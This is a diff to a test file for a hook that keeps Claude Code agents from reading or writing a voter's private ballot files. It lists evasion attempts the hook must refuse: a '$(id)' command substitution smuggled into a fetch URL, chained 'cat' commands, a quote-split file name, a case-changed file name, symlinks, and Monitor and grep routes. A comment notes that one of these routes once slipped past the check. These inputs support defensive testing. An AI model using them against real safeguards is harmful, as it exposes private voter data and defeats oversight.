@@ -58,7 +58,6 @@ const project = () => {
     fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
     fs.writeFileSync(path.join(root, rel), text);
   };
-  write("addresses.yaml", "addr-mom: {}\n");
   write(`.bindings/${TOKEN}`, `${BALLOT} us-house-07\n`);
   write(`.bindings/${OTHER_TOKEN}`, `${BALLOT} question-1\n`);
   for (const agent of AGENTS) {
@@ -90,7 +89,7 @@ const project = () => {
   write(`${BALLOT}/review/question-1.neutrality.md`, "x\n");
   // A planted link out of articles/, to the file no agent may read.
   fs.symlinkSync(
-    path.join(root, "addresses.yaml"),
+    path.join(root, BALLOT, "private.yaml"),
     path.join(root, BALLOT, "articles", "linked.md"),
   );
   // A planted link to a directory, so articles/inner/../secret.md reads as an
@@ -184,9 +183,9 @@ describe("session-guard: the discovery agent", () => {
       root,
       [
         [bash("ls"), "agent-command-denied"],
-        [bash("cat addresses.yaml"), "agent-command-denied"],
-        [bash(`${FETCH} ${TOKEN} --brief; cat addresses.yaml`), "agent-command-denied"],
-        [bash(`${FETCH} ${TOKEN} --brief\ncat addresses.yaml`), "agent-command-denied"],
+        [bash(`cat ${BALLOT}/private.yaml`), "agent-command-denied"],
+        [bash(`${FETCH} ${TOKEN} --brief; cat ${BALLOT}/private.yaml`), "agent-command-denied"],
+        [bash(`${FETCH} ${TOKEN} --brief\ncat ${BALLOT}/private.yaml`), "agent-command-denied"],
         [
           bash(`${FETCH} ${TOKEN} jane-example bio https://x.example/$(id)`),
           "agent-command-denied",
@@ -217,7 +216,7 @@ describe("session-guard: the discovery agent", () => {
           bash(`node Xclaude/skills/research-candidates/scripts/discovery-fetch ${TOKEN} --brief`),
           "agent-command-denied",
         ],
-        [call("Read", { file_path: path.join(root, "addresses.yaml") }), "agent-tool-denied"],
+        [call("Read", { file_path: path.join(root, BALLOT, "private.yaml") }), "agent-tool-denied"],
         [call("WebFetch", { url: "https://x.example/", prompt: "p" }), "agent-tool-denied"],
         [call("Write", { file_path: path.join(root, "x"), content: "" }), "agent-tool-denied"],
         // An agent no launch started, or one started for another agent.
@@ -251,7 +250,6 @@ describe("session-guard: the compile and neutrality agents", () => {
       agentHook("compile"),
       root,
       [
-        [read("addresses.yaml"), "agent-path-denied"],
         [read(`${BALLOT}/private.yaml`), "agent-path-denied"],
         [read("publish.yaml"), "agent-path-denied"],
         [read(`.bindings/${TOKEN}`), "agent-path-denied"],
@@ -294,7 +292,7 @@ describe("session-guard: the compile and neutrality agents", () => {
         ],
         // A call that does not say it is this agent's is refused, never let through.
         [
-          { tool_name: "Read", tool_input: { file_path: at(root, "addresses.yaml") } },
+          { tool_name: "Read", tool_input: { file_path: at(root, `${BALLOT}/private.yaml`) } },
           "agent-type-mismatch",
         ],
         [{ ...read(`${BALLOT}/ballot.yaml`), agent_type: "Explore" }, "agent-type-mismatch"],
@@ -556,7 +554,7 @@ describe("session-guard: the main session's launch of each agent", () => {
         ],
         [launch(agentName("compile"), TOKEN, { isolation: "remote" }), "agent-isolation-denied"],
         [launch("Explore", "Find the tests."), "agent-type-denied"],
-        [launch("general-purpose", "Read addresses.yaml."), "agent-type-denied"],
+        [launch("general-purpose", "Read private.yaml."), "agent-type-denied"],
         [{ tool_name: "Agent", tool_input: { prompt: "No type named." } }, "agent-type-denied"],
         [
           { tool_name: "Task", tool_input: { subagent_type: "fork", prompt: "Carry on." } },
@@ -647,35 +645,31 @@ describe("session-guard: the main session and the private files", () => {
   const monitor = (command) => ({ tool_name: "Monitor", tool_input: { command } });
   const code = "private-file-denied";
 
-  // Value: protects=Rule 5: the model never reads or writes addresses.yaml, and only scripts read private.yaml; fails_when=a Bash call, a file tool or a Grep names or reaches either file and runs, or Read or Grep leaves the matcher; why_new=only the Rule 7 agents' allow lists covered these files, and the main session could read and write both; seam=hook; no_claim=a shell glob, which names neither file (README.md, Data-repo settings)
-  it("refuses a read or write of either file, and leaves other files alone", () => {
+  // Value: protects=Rule 5: only scripts read private.yaml, and the model never writes it; fails_when=a Bash call, a file tool or a Grep names or reaches the file and runs, or Read or Grep leaves the matcher; why_new=only the Rule 7 agents' allow lists covered the private files, and the main session could read and write them; seam=hook; no_claim=a shell glob, which names no file (README.md, Data-repo settings)
+  it("refuses a read or write of private.yaml, and leaves other files alone", () => {
     const root = project();
     const matcher = settings.hooks.PreToolUse[0].matcher.split("|");
     assert.ok(matcher.includes("Read"), "the settings hook never sees a Read");
     assert.ok(matcher.includes("Grep"), "the settings hook never sees a Grep");
     assert.ok(matcher.includes("Monitor"), "the settings hook never sees a Monitor command");
     const deny = settings.permissions.deny;
-    for (const rule of [
-      "Read(/addresses.yaml)",
-      "Read(/**/private.yaml)",
-      "Edit(/addresses.yaml)",
-      "Edit(/**/private.yaml)",
-    ]) {
+    for (const rule of ["Read(/**/private.yaml)", "Edit(/**/private.yaml)"]) {
       assert.ok(deny.includes(rule), `${rule} is not denied`);
     }
     expect(
       hook,
       root,
       [
-        [bash("cat addresses.yaml"), code],
         [bash(`cat ${BALLOT}/private.yaml`), code],
-        [bash("echo x >> addresses.yaml"), code],
-        [bash("cat addr''esses.yaml"), code],
+        [bash(`echo x >> ${BALLOT}/private.yaml`), code],
+        [bash(`cat ${BALLOT}/priv''ate.yaml`), code],
         // A case-insensitive filesystem opens the file under this name too.
-        [bash("cat ./ADDRESSES.YAML"), code],
-        [read(path.join(root, "addresses.yaml")), code],
+        [bash(`cat ./${BALLOT}/PRIVATE.YAML`), code],
         [read(path.join(root, BALLOT, "private.yaml")), code],
-        [{ tool_name: "Write", tool_input: { file_path: "addresses.yaml", content: "x" } }, code],
+        [
+          { tool_name: "Write", tool_input: { file_path: `${BALLOT}/private.yaml`, content: "x" } },
+          code,
+        ],
         [
           {
             tool_name: "Edit",
@@ -686,7 +680,7 @@ describe("session-guard: the main session and the private files", () => {
         [
           {
             tool_name: "MultiEdit",
-            tool_input: { file_path: "addresses.yaml", edits: [{ old_string: "a" }] },
+            tool_input: { file_path: `${BALLOT}/private.yaml`, edits: [{ old_string: "a" }] },
           },
           code,
         ],
@@ -694,7 +688,7 @@ describe("session-guard: the main session and the private files", () => {
         [
           {
             tool_name: "Write",
-            tool_input: { file_path: "/r/x.sh", content: "cat addresses.yaml\n" },
+            tool_input: { file_path: "/r/x.sh", content: `cat ${BALLOT}/private.yaml\n` },
           },
           code,
         ],
@@ -719,14 +713,13 @@ describe("session-guard: the main session and the private files", () => {
     );
   });
 
-  // Value: protects=Rule 5 past the Bash tool's own name: a Monitor command is a shell command, and every Bash refusal holds for it; fails_when=Monitor leaves the matcher or session-guard lets it through because of its tool_name; why_new=Claude Code before 2.1.314 does not run a Bash matcher on Monitor commands, so cat addresses.yaml ran unchecked; seam=hook; no_claim=a WebSocket watch's frames, which no file read produces
+  // Value: protects=Rule 5 past the Bash tool's own name: a Monitor command is a shell command, and every Bash refusal holds for it; fails_when=Monitor leaves the matcher or session-guard lets it through because of its tool_name; why_new=Claude Code before 2.1.314 does not run a Bash matcher on Monitor commands, so cat private.yaml ran unchecked; seam=hook; no_claim=a WebSocket watch's frames, which no file read produces
   it("holds a Monitor command to every Bash refusal", () => {
     const root = project();
     expect(
       hook,
       root,
       [
-        [monitor("cat addresses.yaml"), code],
         [monitor(`tail -f ${BALLOT}/private.yaml`), code],
         [monitor("rg Elm"), code],
         [monitor("ballot-check --show x"), "researcher-only-mode"],
@@ -738,7 +731,7 @@ describe("session-guard: the main session and the private files", () => {
   });
 
   // Value: protects=Rule 5 in a default session: Claude Code has no Grep tool on macOS, Linux or WSL, so the search a session really runs goes through Bash; fails_when=a recursive search from the root, an election or a ballot runs, or a search that stays below a ballot directory is refused; why_new=grep -rn Elm . read both files with the Grep check never called; seam=hook; no_claim=a shell glob, a search tool not listed, or a directory given only in a variable
-  it("refuses a recursive shell search that reaches either file, and leaves deeper ones alone", () => {
+  it("refuses a recursive shell search that reaches private.yaml, and leaves deeper ones alone", () => {
     const root = project();
     const election = BALLOT.split("/")[0];
     expect(
@@ -978,7 +971,7 @@ describe("session-guard: the main session and the private files", () => {
         [
           {
             tool_name: "Edit",
-            tool_input: { file_path: "a", old_string: "a", new_string: "cat addresses.yaml" },
+            tool_input: { file_path: "a", old_string: "a", new_string: "cat x/y/private.yaml" },
           },
           code,
         ],
@@ -1036,7 +1029,7 @@ describe("session-guard: the main session and the ballot files", () => {
   const read = (file_path) => ({ tool_name: "Read", tool_input: { file_path } });
   const grep = (input) => ({ tool_name: "Grep", tool_input: { pattern: "Elm", ...input } });
 
-  // Value: protects=Rule 5 and Rule 7: the sample ballot and downloads can name or locate the voter, and unfetchable.md holds attacker-chosen URLs, so the main session reads none of them while the compile agent still reads its companions; fails_when=a main-session call names or reaches one and runs, or the settings hook refuses a Rule 7 agent's own read; why_new=the hook covered only addresses.yaml and private.yaml; seam=hook; no_claim=a glob, which names none of them (README.md, Data-repo settings)
+  // Value: protects=Rule 5 and Rule 7: the sample ballot and downloads can name or locate the voter, and unfetchable.md holds attacker-chosen URLs, so the main session reads none of them while the compile agent still reads its companions; fails_when=a main-session call names or reaches one and runs, or the settings hook refuses a Rule 7 agent's own read; why_new=the hook covered only the two private files; seam=hook; no_claim=a glob, which names none of them (README.md, Data-repo settings)
   it("refuses the main session, and leaves the compile agent's reads alone", () => {
     const root = project();
     const deny = settings.permissions.deny;
